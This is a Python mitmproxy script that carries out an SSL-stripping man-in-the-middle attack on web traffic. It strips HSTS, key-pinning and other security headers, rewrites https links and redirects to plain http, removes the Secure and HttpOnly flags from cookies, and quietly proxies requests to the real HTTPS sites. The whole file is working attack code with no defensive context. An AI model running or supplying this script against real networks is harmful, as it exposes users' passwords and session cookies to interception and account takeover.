from netlib.http import decoded
import re
from six.moves import urllib

def start(context, argv) :

    #set of SSL/TLS capable hosts
    context.secure_hosts = set()

def request(context, flow) :

    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)
    
    #do not force https redirection
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    #proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in context.secure_hosts :
        flow.request.scheme = 'https'
        flow.request.port = 443
        flow.request.host = flow.request.pretty_host

def response(context, flow) :

    with decoded(flow.response) :
        flow.response.headers.pop('Strict-Transport-Security', None)
        flow.response.headers.pop('Public-Key-Pins', None)

	#strip all secure headers
        flow.response.headers.pop('Content-Security-Policy', None)
        flow.response.headers.pop('X-XSS-Protection', None)
        flow.response.headers.pop('X-Frame-Options', None)

        # strip meta tag upgrade-insecure-requests in response body
        csp_meta_tag_pattern = '<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
        flow.response.content = re.sub(csp_meta_tag_pattern, '', flow.response.content, flags=re.IGNORECASE)

	#Parse all https link and add hostname to secure_host set
	context.secure_hosts.update([urllib.parse.urlparse(link).hostname for link in re.findall('https://[^\s"\']+', flow.response.content)])

        #strip links in response body
        flow.response.content = flow.response.content.replace('https://', 'http://')

	#strip port 443 to 80
        flow.response.content = flow.response.content.replace(':443', ':80')

        #strip links in 'Location' header
        if flow.response.headers.get('Location','').startswith('https://'):
            location = flow.response.headers['Location']
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                context.secure_hosts.add(hostname)
            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        #strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
	#strip httponly flag from 'Set-Cookie' headers
        cookies = [re.sub(r';\s*HttpOnly\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)  
